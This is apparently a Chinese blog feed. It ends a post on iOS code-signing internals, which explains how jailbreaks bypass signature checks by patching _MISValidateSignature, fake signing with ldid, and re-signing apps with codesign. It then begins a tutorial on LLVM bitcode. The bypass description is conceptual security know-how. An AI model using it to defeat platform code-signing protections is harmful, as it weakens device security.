</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">* CODE SIGNING:</span>
</span><span class='line'><span class="cm">* When soft faulting a page, we have to validate the page if:</span>
</span><span class='line'><span class="cm">* 1. the page is being mapped in user space</span>
</span><span class='line'><span class="cm">* 2. the page hasn&#39;t already been found to be &quot;tainted&quot;</span>
</span><span class='line'><span class="cm">* 3. the page belongs to a code-signed object</span>
</span><span class='line'><span class="cm">* 4. the page has not been validated yet or has been mapped</span>
</span><span class='line'><span class="cm">for write. */</span>
</span><span class='line'><span class="cp">#define VM_FAULT_NEED_CS_VALIDATION(pmap, page)</span>
</span><span class='line'><span class="p">((</span><span class="n">pmap</span><span class="p">)</span> <span class="o">!=</span> <span class="n">kernel_pmap</span> <span class="cm">/*1*/</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">cs_tainted</span> <span class="cm">/*2*/</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">code_signed</span> <span class="cm">/*3*/</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">cs_validated</span> <span class="o">||</span> <span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">wpmapped</span> <span class="cm">/*4*/</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>vm_page_validate_cs</code>会计算当前代码页的哈希值，并与签名中CodeDirectory记录的值进行比对，完成代码签名的验证。如果不符，且不满足系统预设的例外条件，则会向内核发出CS_KILL指令，将进程结束。</p>

<p>至此签名的校验流程就全部完成了。</p>

<h2>0x07 越狱与重签名</h2>

<h4>越狱</h4>

<p>越狱之后，签名校验机制会被破坏掉，否则用于实现越狱的代码自身就无法运行。比如在iOS6/7时代，典型的方式是替换 <code>libmis.dylib</code>中的<code>_MISValidateSignature</code>函数，使其永远返回验证成功，简单粗暴但很有效，因此越狱的设备可以不受签名限制运行任意程序。但是单纯解决掉这个函数只是解决了MachO文件的Load问题，运行时仍然会有沙盒和Code Directory的校验，想要对系统完全的控制权必须同时解决掉这两个问题。</p>

<p>由于沙盒机制的实现分散在系统的各个角落，没有简单的方式可以将沙盒一刀切地屏蔽掉，因此一般越狱并不会破坏掉沙盒。但因为越狱设备签名校验机制被绕过，不再会根据embedded.mobileprovision文件检查Entitlements的合法性，因此我们可以在沙盒范围内，声明任意的权限。Code Directory的校验在内核层，破解难度相对较大，并且完全没有必要进行破解，因为Code Directory只是单纯地校验未加密的哈希值而已，只需要按照代码签名的格式做好Code Directory即可。</p>

<p>越狱之父Saurik为此创造了<a href="http://iphonedevwiki.net/index.php/Ldid">ldid</a>这个工具，用于给越狱设备上的程序制造&#8221;假&#8221;的签名。使用ldid进行签名只需要指定一个可选的<code>Entitlements</code>文件，签名之后，产生的LC_CODE_SIGNATURE中只会两个有效的Blob，分别是 Code Directory和 Entitlements，并没有最重要的CMS Signature部分，因为<code>_MISCalidateSignature</code>永远都会告诉系统签名是正确的。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cp TestCodeSign TestCodeSign.ldid
</span><span class='line'><span class="nv">$ </span>ldid -Sxxx.entitlements TestCodeSign.ldid
</span><span class='line'><span class="nv">$ </span>jtool --sig TestCodeSign.ldid -arch arm64
</span><span class='line'>Blob at offset: 54016 <span class="o">(</span>928 bytes<span class="o">)</span> is an embedded signature
</span><span class='line'>Code Directory <span class="o">(</span>442 bytes<span class="o">)</span>
</span><span class='line'>    ...
</span><span class='line'> Empty requirement <span class="nb">set</span> <span class="o">(</span>12 bytes<span class="o">)</span>
</span><span class='line'>Entitlements <span class="o">(</span>424 bytes<span class="o">)</span> <span class="o">(</span>use --ent to view<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h4>重签名</h4>

<p>有的时候出于各种原因，我们需要对一个App进行重签名，然后在自己的设备上进行测试。回顾一下签名的必备条件：</p>

<ul>
<li>开发者证书，以及对应的密钥</li>
<li>Entitlements文件</li>
<li>embedded.mobileprovision</li>
</ul>


<p>开发者证书和密钥我们已经有了，对于Entitlements和embedded.mobileprovision文件，为了确保重签后的App能够正常运行，必须使用和原App相同或者至少包含原App所需权限的Entitlements文件。这个并不难操作，只需要新建一个工程，开启相应的功能，让Xcode自动为我们生成即可。但是Entitlements文件中还有一些跟Team ID和App ID相关的配置，这两个是没有办法伪造的，因为我们不能使用已经被其他开发者注册过的ID。使用自己的ID一般也不会有什么问题，但在某些情况下可能导致最终的程序逻辑出现异常，这根具体的代码实现细节有关。</p>

<p>现在，只要确保有正确的Entitlements文件，Provisioning Profile与Entitlements文件匹配，且包含重签时使用的证书及目标设备的UUID，就可以进行重签名了，如果重签名后无法安装，请检查Provisioning Profile文件是否满足上述条件。</p>

<p>Entitlements文件中还标识了<code>application-identifier</code>，也就是Bundle ID，正常签名的App中，这个值和Info.plist中的<code>CFBundleIdentifier</code>的值是相同的，但实际在签名校验过程中，系统并不会检查二者是否一致。因此即使Entitlements中与Info.plist文件使用了不同的Bundle ID，理论上也不会影响重签名之后的运行。</p>

<p>需要注意，App中除了可执行程序文件外，还会可能会有Frameworks及Plugins，里面都会包含二进制的代码文件，他们的哈希值也会被存储在 _CodeSignature/CodeResources中。所有的二进制代码都必须进行签名，而签名后二进制文件的哈希值就会产生变化，因此需要先对这两个文件夹下的二进制文件进行签名，再对App进行签名。</p>

<p>重签名的基本流程如下，使用-f参数可以强制覆盖掉已有的签名</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="c"># 对Frameworks及Plugins中的每一个文件进行签名，此时不需要指定entitlements</span>
</span><span class='line'><span class="nv">$ </span>codesign -f -s <span class="s2">&quot;证书名称或者SHA1值&quot;</span> Target.app/Frameworks/xxxxx.framework
</span><span class='line'><span class="nv">$ </span>codesign -f -s <span class="s2">&quot;证书名称或者SHA1值&quot;</span> Target.app/Frameworks/libxxxx.dylib
</span><span class='line'><span class="nv">$ </span>...
</span><span class='line'><span class="nv">$ </span><span class="c"># 将准备好的Provisioning Profile拷贝到App根目录</span>
</span><span class='line'><span class="nv">$ </span>cp ~/Library/MobileDevice/Provisioning<span class="se">\ </span>Profiles/xxxxx.mobileprovision Target.app/embedded.mobileprovision
</span><span class='line'><span class="nv">$ </span><span class="c"># 对App进行签名</span>
</span><span class='line'><span class="nv">$ </span>codesign -f -s <span class="s2">&quot;证书名称或者SHA1值&quot;</span> --entitlements resign.entitlements Target.app
</span></code></pre></td></tr></table></div></figure>


<h2>0x08 References</h2>

<table>
<thead>
<tr>
<th></th>
<th>   reference    </th>
<th>    link    </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> Code Signing Guide </td>
<td> <a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Introduction/Introduction.html">https://developer.apple.com/&hellip;</a> </td>
</tr>
<tr>
<td></td>
<td> ASN.1 JavaScript decoder </td>
<td> <a href="http://lapo.it/asn1js/">http://lapo.it/asn1js/</a> </td>
</tr>
<tr>
<td></td>
<td> Cryptographic Message Syntax (CMS) </td>
<td> <a href="https://www.ietf.org/rfc/rfc3852.txt">https://www.ietf.org/rfc/rfc3852.txt</a> </td>
</tr>
<tr>
<td></td>
<td> iSign in python </td>
<td> <a href="https://github.com/saucelabs/isign">https://github.com/saucelabs/isign</a> </td>
</tr>
<tr>
<td></td>
<td> CodeSigning (RSACon 2015) </td>
<td> <a href="http://newosxbook.com/articles/CodeSigning.pdf">http://newosxbook.com/articles/CodeSigning.pdf</a> </td>
</tr>
<tr>
<td></td>
<td> jtool </td>
<td> <a href="http://www.newosxbook.com/tools/jtool.html">http://www.newosxbook.com/tools/jtool.html</a> </td>
</tr>
<tr>
<td></td>
<td> mistool </td>
<td> <a href="http://newosxbook.com/tools/mistool.html">http://newosxbook.com/tools/mistool.html</a> </td>
</tr>
<tr>
<td></td>
<td> evasi0n7 jailbreak writeup </td>
<td><a href="https://geohot.com/e7writeup.html">https://geohot.com/e7writeup.html</a> </td>
</tr>
<tr>
<td></td>
<td> iOS hacker&rsquo;s handbook </td>
<td> <a href="https://books.google.com.hk/books?id=1kDcjKcz9GwC">https://books.google.com.hk/books?id=1kDcjKcz9GwC</a> </td>
</tr>
</tbody>
</table>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[关于bitcode, 知道这些就够了]]></title>
    <link href="http://xelz.info/blog/2018/11/24/all-you-need-to-know-about-bitcode/"/>
    <updated>2018-11-24T17:17:28+08:00</updated>
    <id>http://xelz.info/blog/2018/11/24/all-you-need-to-know-about-bitcode</id>
    <content type="html"><![CDATA[<h2>0x00 前言</h2>

<p>苹果在WWDC 2015大会上引入了bitcode，随后在Xcode7中添加了在二进制中嵌入bitcode(Enable Bitcode)的功能，并且默认设置为开启状态。很多开发者在集成第三方SDK的时候都被bitcode坑过一把，然后google百度一番发现只要关闭bitcode就可以了，但是大部分开发者都不清楚bitcode到底是什么东西。这篇文档将给大家详细地介绍与bitcode有关的内容。</p>

<h2>0x01 什么是bitcode</h2>

<p>研究bitcode之前需要先了解一下LLVM，因为bitcode是由LLVM引入的一种中间代码(Intermediate Representation，简称IR)，它是源代码被编译为二进制机器码过程中的中间表示形态，它既不是源代码，也不是机器码。从代码组织结构上看它比较接近机器码，但是在函数和指令层面使用了很多高级语言的特性。</p>

<p>LLVM是一套优秀的编译器框架，目前NDK/Xcode均采用LLVM作为默认的编译器。LLVM的编译过程可以简单分为3个部分:</p>

<p><img src="http://xelz.info/assets/2018/RetargetableCompiler.png" alt="" /></p>

<center>图来自 http://www.aosabook.org/en/llvm.html</center>


<ol>
<li>前端(Frontend)，负责把各种类型的源代码编译为中间表示，也就是bitcode，在LLVM体系内，不同的语言有不同的编译器前端，最常见的如clang负责c/c++/oc的编译，flang负责fortran的编译，swiftc负责swift的编译等等</li>
<li>优化(Optimizer)，负责对bitcode进行各种类型的优化，将bitcode代码进行一些逻辑等价的转换，使得代码的执行效率更高，体积更小，比如DeadStrip/SimplifyCFG</li>
<li>后端(Backend)，也叫CodeGenerator，负责把优化后的bitcode编译为指定目标架构的机器码，比如X86Backend负责把bitcode编译为x86指令集的机器码</li>
</ol>


<p>在这个体系中，不同语言的源代码将会被转化为统一的bitcode格式，三个模块可以充分复用，防止重复造轮子。如果要开发一门新的<code>x语言</code>，只需要造一个x语言的前端，将x语言的源代码编译为bitcode，优化和后端的事情完全不用管。同理，如果新的芯片架构问世，则只需要基于LLVM重新写一套目标平台的后端，非常方便。</p>

<h2>0x02 bitcode初探</h2>

<p>既然bitcode是代码的一种表示形式，因此它也会有自己的一套独立的语法，可以通过一个简单的例子来一探究竟，这里以clang为例，swift的操作和结果可能稍有不同。</p>

<p>本文所涉及的内容可以自行操作，也可以直接下载<a href="http://xelz.info/assets/2018/bitcode-demo.zip">我写这篇文章时保存的副本</a></p>

<p>先编写一段helloworld代码(test.c)：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hello, world.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>通过以下命令可以将源代码编译为object文件:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -c test.c -o test.o
</span><span class='line'><span class="nv">$ </span>file test.o
</span><span class='line'>test.o: Mach-O 64-bit object x86_64
</span></code></pre></td></tr></table></div></figure>


<p>其实，这个命令同时完成了前端、优化、后端三个部分，可以通过 <code>-emit-llvm -c</code> 将前端这一步单独拆出来，这样就可以看到bitcode了:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -emit-llvm -c test.c -o test.bc <span class="c"># 将源代码编译为bitcode</span>
</span><span class='line'><span class="nv">$ </span>file test.bc
</span><span class='line'>test.bc: LLVM bitcode, wrapper x86_64
</span><span class='line'><span class="nv">$ </span>clang -c test.bc -o test.bc.o <span class="c"># 将bitcode编译为object</span>
</span><span class='line'><span class="nv">$ </span>file test.bc.o
</span><span class='line'>test.bc.o: Mach-O 64-bit object x86_64
</span><span class='line'><span class="nv">$ </span>md5 test.bc.o test.o
</span><span class='line'>MD5 <span class="o">(</span>test.bc.o<span class="o">)</span> <span class="o">=</span> 70ea3a520c26df84d1f7ca552e8e6620
</span><span class='line'>MD5 <span class="o">(</span>test.o<span class="o">)</span> <span class="o">=</span> 70ea3a520c26df84d1f7ca552e8e6620
</span></code></pre></td></tr></table></div></figure>


<p>bitcode文件使用后缀名<code>.bc</code>表示，可以看到，将bitcode文件作为clang的输入，编出的object文件跟直接编源代码是相同的。然后在来看一下bitcode文件:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>hexdump -C test.bc  <span class="p">|</span> head
</span><span class='line'>00000000  de c0 17 0b 00 00 00 00  14 00 00 00 08 0b 00 00  <span class="p">|</span>................<span class="p">|</span>
</span><span class='line'>00000010  07 00 00 01 42 43 c0 de  35 14 00 00 07 00 00 00  <span class="p">|</span>....BC..5.......<span class="p">|</span>
</span><span class='line'>00000020  62 0c 30 24 96 96 a6 a5  f7 d7 7f 4d d3 b4 5f d7  <span class="p">|</span>b.0<span class="nv">$.</span>......M.._.<span class="p">|</span>
</span><span class='line'>00000030  3e 9e fb f9 4f 0b 51 80  4c 01 00 00 21 0c 00 00  <span class="p">|</span>&gt;...O.Q.L...!...<span class="p">|</span>
</span><span class='line'>00000040  74 02 00 00 0b 02 21 00  02 00 00 00 13 00 00 00  <span class="p">|</span>t.....!.........<span class="p">|</span>
</span><span class='line'>00000050  07 81 23 91 41 c8 04 49  06 10 32 39 92 01 84 0c  <span class="p">|</span>..#.A..I..29....<span class="p">|</span>
</span><span class='line'>00000060  25 05 08 19 1e 04 8b 62  80 10 45 02 42 92 0b 42  <span class="p">|</span>%......b..E.B..B<span class="p">|</span>
</span><span class='line'>00000070  84 10 32 14 38 08 18 4b  0a 32 42 88 48 90 14 20  <span class="p">|</span>..2.8..K.2B.H.. <span class="p">|</span>
</span><span class='line'>00000080  43 46 88 a5 00 19 32 42  04 49 0e 90 11 22 c4 50  <span class="p">|</span>CF....2B.I...<span class="err">&quot;</span>.P<span class="p">|</span>
</span><span class='line'>00000090  41 51 81 8c e1 83 e5 8a  04 21 46 06 51 18 00 00  <span class="p">|</span>AQ.......!F.Q...<span class="p">|</span>
</span></code></pre></td></tr></table></div></figure>


<p>通过hexdump可以看出这个文件并非文本文件，全是乱码，这样的文件是很难分析的。其实LLVM提供了<code>llvm-dis</code>/ <code>llvm-as</code> 两个工具，用于将bitcode在二进制格式和可读的文本格式之间进行相互的转化，但遗憾的是Xcode的编译器工具链中并没有附带这个命令，因此只能另寻他法。</p>

<!-- more -->


<p>我们知道通过编译器的<code>-S</code>参数可以将源代码编译为文本的assembly代码，不进行最后一步assembly到机器码的翻译工作，而assembly和机器码是等价的两种表示形式，bitcode同样也是有文本和二进制(bitcode)两种等价表示形式，clang也为bitcode保留了这一特性，可以通过<code>-emit-llvm -S</code> 将源代码编译为文本格式的bitcode， 也叫做LLVM Assembly Language，一般后缀名使用<code>.ll</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -emit-llvm -S test.c -o test.ll <span class="c"># 将源代码编译为LLVM Assembly</span>
</span></code></pre></td></tr></table></div></figure>


<p>test.ll的全部内容如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='llvm'><span class='line'><span class="c">; ModuleID = &#39;test.c&#39;</span>
</span><span class='line'><span class="err">source_filename</span> <span class="p">=</span> <span class="s">&quot;test.c&quot;</span>
</span><span class='line'><span class="k">target</span> <span class="k">datalayout</span> <span class="p">=</span> <span class="s">&quot;e-m:o-i64:64-f80:128-n8:16:32:64-S128&quot;</span>
</span><span class='line'><span class="k">target</span> <span class="k">triple</span> <span class="p">=</span> <span class="s">&quot;x86_64-apple-macosx10.14.0&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vg">@.str</span> <span class="p">=</span> <span class="k">private</span> <span class="err">unnamed_addr</span> <span class="k">constant</span> <span class="p">[</span><span class="m">15</span> <span class="k">x</span> <span class="k">i8</span><span class="p">]</span> <span class="k">c</span><span class="s">&quot;hello, world.\0A\00&quot;</span><span class="p">,</span> <span class="k">align</span> <span class="m">1</span>
</span><span class='line'>
</span><span class='line'><span class="c">; Function Attrs: noinline nounwind optnone ssp uwtable</span>
</span><span class='line'><span class="k">define</span> <span class="k">i32</span> <span class="vg">@main</span><span class="p">()</span> <span class="err">#</span><span class="m">0</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv-Anonymous">%1</span> <span class="p">=</span> <span class="k">alloca</span> <span class="k">i32</span><span class="p">,</span> <span class="k">align</span> <span class="m">4</span>
</span><span class='line'>  <span class="k">store</span> <span class="k">i32</span> <span class="m">0</span><span class="p">,</span> <span class="k">i32</span><span class="p">*</span> <span class="nv-Anonymous">%1</span><span class="p">,</span> <span class="k">align</span> <span class="m">4</span>
</span><span class='line'>  <span class="nv-Anonymous">%2</span> <span class="p">=</span> <span class="k">call</span> <span class="k">i32</span> <span class="p">(</span><span class="k">i8</span><span class="p">*,</span> <span class="p">...)</span> <span class="vg">@printf</span><span class="p">(</span><span class="k">i8</span><span class="p">*</span> <span class="k">getelementptr</span> <span class="k">inbounds</span> <span class="p">([</span><span class="m">15</span> <span class="k">x</span> <span class="k">i8</span><span class="p">],</span> <span class="p">[</span><span class="m">15</span> <span class="k">x</span> <span class="k">i8</span><span class="p">]*</span> <span class="vg">@.str</span><span class="p">,</span> <span class="k">i32</span> <span class="m">0</span><span class="p">,</span> <span class="k">i32</span> <span class="m">0</span><span class="p">))</span>
</span><span class='line'>  <span class="k">ret</span> <span class="k">i32</span> <span class="m">0</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">declare</span> <span class="k">i32</span> <span class="vg">@printf</span><span class="p">(</span><span class="k">i8</span><span class="p">*,</span> <span class="p">...)</span> <span class="err">#</span><span class="m">1</span>
</span><span class='line'>
</span><span class='line'><span class="err">attributes</span> <span class="err">#</span><span class="m">0</span> <span class="p">=</span> <span class="p">{</span> <span class="k">noinline</span> <span class="k">nounwind</span> <span class="err">optn</span><span class="k">one</span> <span class="k">ssp</span> <span class="err">uwtable</span> <span class="s">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;disable-tail-calls&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;less-precise-fpmad&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-frame-pointer-elim&quot;</span><span class="p">=</span><span class="s">&quot;true&quot;</span> <span class="s">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="s">&quot;no-infs-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-jump-tables&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-nans-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-signed-zeros-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-trapping-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;stack-protector-buffer-size&quot;</span><span class="p">=</span><span class="s">&quot;8&quot;</span> <span class="s">&quot;target-cpu&quot;</span><span class="p">=</span><span class="s">&quot;penryn&quot;</span> <span class="s">&quot;target-features&quot;</span><span class="p">=</span><span class="s">&quot;+cx16,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="s">&quot;unsafe-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;use-soft-float&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="p">}</span>
</span><span class='line'><span class="err">attributes</span> <span class="err">#</span><span class="m">1</span> <span class="p">=</span> <span class="p">{</span> <span class="s">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;disable-tail-calls&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;less-precise-fpmad&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-frame-pointer-elim&quot;</span><span class="p">=</span><span class="s">&quot;true&quot;</span> <span class="s">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="s">&quot;no-infs-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-nans-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-signed-zeros-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;no-trapping-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;stack-protector-buffer-size&quot;</span><span class="p">=</span><span class="s">&quot;8&quot;</span> <span class="s">&quot;target-cpu&quot;</span><span class="p">=</span><span class="s">&quot;penryn&quot;</span> <span class="s">&quot;target-features&quot;</span><span class="p">=</span><span class="s">&quot;+cx16,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="s">&quot;unsafe-fp-math&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="s">&quot;use-soft-float&quot;</span><span class="p">=</span><span class="s">&quot;false&quot;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">!llvm.module.flags</span> <span class="p">=</span> <span class="p">!{</span><span class="nv-Anonymous">!0</span><span class="p">,</span> <span class="nv-Anonymous">!1</span><span class="p">}</span>
</span><span class='line'><span class="nv">!llvm.ident</span> <span class="p">=</span> <span class="p">!{</span><span class="nv-Anonymous">!2</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv-Anonymous">!0</span> <span class="p">=</span> <span class="p">!{</span><span class="k">i32</span> <span class="m">1</span><span class="p">,</span> <span class="nv">!&quot;wchar_size&quot;</span><span class="p">,</span> <span class="k">i32</span> <span class="m">4</span><span class="p">}</span>
</span><span class='line'><span class="nv-Anonymous">!1</span> <span class="p">=</span> <span class="p">!{</span><span class="k">i32</span> <span class="m">7</span><span class="p">,</span> <span class="nv">!&quot;PIC Level&quot;</span><span class="p">,</span> <span class="k">i32</span> <span class="m">2</span><span class="p">}</span>
</span><span class='line'><span class="nv-Anonymous">!2</span> <span class="p">=</span> <span class="p">!{</span><span class="nv">!&quot;Apple LLVM version 10.0.0 (clang-1000.11.45.5)&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>这样看上去就很清晰明了了，我们重点关注下函数定义这部分，我加了一些注释方便理解</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='llvm'><span class='line'><span class="c">; 定义全局常量 @.str, 内容初始化为 &#39;hello, world.\n\0&#39;</span>
</span><span class='line'><span class="vg">@.str</span> <span class="p">=</span> <span class="k">private</span> <span class="err">unnamed_addr</span> <span class="k">constant</span> <span class="p">[</span><span class="m">15</span> <span class="k">x</span> <span class="k">i8</span><span class="p">]</span> <span class="k">c</span><span class="s">&quot;hello, world.\0A\00&quot;</span><span class="p">,</span> <span class="k">align</span> <span class="m">1</span>
</span><span class='line'>
</span><span class='line'><span class="c">; Function Attrs: noinline nounwind optnone ssp uwtable</span>
</span><span class='line'><span class="k">define</span> <span class="k">i32</span> <span class="vg">@main</span><span class="p">()</span> <span class="err">#</span><span class="m">0</span> <span class="p">{</span> <span class="c">; 定义函数 @main，返回值为i32类型</span>
</span><span class='line'>  <span class="nv-Anonymous">%1</span> <span class="p">=</span> <span class="k">alloca</span> <span class="k">i32</span><span class="p">,</span> <span class="k">align</span> <span class="m">4</span> <span class="c">; 声明变量 %1 = 分配i32的内存空间</span>
</span><span class='line'>  <span class="k">store</span> <span class="k">i32</span> <span class="m">0</span><span class="p">,</span> <span class="k">i32</span><span class="p">*</span> <span class="nv-Anonymous">%1</span><span class="p">,</span> <span class="k">align</span> <span class="m">4</span> <span class="c">; 将 0 存入 %1 的内存空间</span>
</span><span class='line'>  <span class="nv-Anonymous">%2</span> <span class="p">=</span> <span class="k">call</span> <span class="k">i32</span> <span class="p">(</span><span class="k">i8</span><span class="p">*,</span> <span class="p">...)</span> <span class="vg">@printf</span><span class="p">(</span><span class="k">i8</span><span class="p">*</span> <span class="k">getelementptr</span> <span class="k">inbounds</span> <span class="p">([</span><span class="m">15</span> <span class="k">x</span> <span class="k">i8</span><span class="p">],</span> <span class="p">[</span><span class="m">15</span> <span class="k">x</span> <span class="k">i8</span><span class="p">]*</span> <span class="vg">@.str</span><span class="p">,</span> <span class="k">i32</span> <span class="m">0</span><span class="p">,</span> <span class="k">i32</span> <span class="m">0</span><span class="p">))</span> <span class="c">; 调用 @printf 函数，并将 @.str 的地址作为参数</span>
</span><span class='line'>  <span class="k">ret</span> <span class="k">i32</span> <span class="m">0</span> <span class="c">; 返回 0</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">declare</span> <span class="k">i32</span> <span class="vg">@printf</span><span class="p">(</span><span class="k">i8</span><span class="p">*,</span> <span class="p">...)</span> <span class="err">#</span><span class="m">1</span> <span class="c">; 声明一个外部函数 @printf</span>
</span></code></pre></td></tr></table></div></figure>


<p>这段代码不难阅读， 其含义和逻辑与我们所写的源代码基本一致，只是用了另外一种语法表示出来。因为没有经过优化，函数中的前两条语句其实是多余的，这在之后的优化阶段会被消除(dead_strip)。bitcode的具体语法在此不做展开，虽然这个例子看起来非常简单易懂，但真实场景中，bitcode的语法远比这个复杂，有兴趣的同学可以直接阅读<a href="https://llvm.org/docs/LangRef.html">LLVM Language Reference Manual</a>。</p>

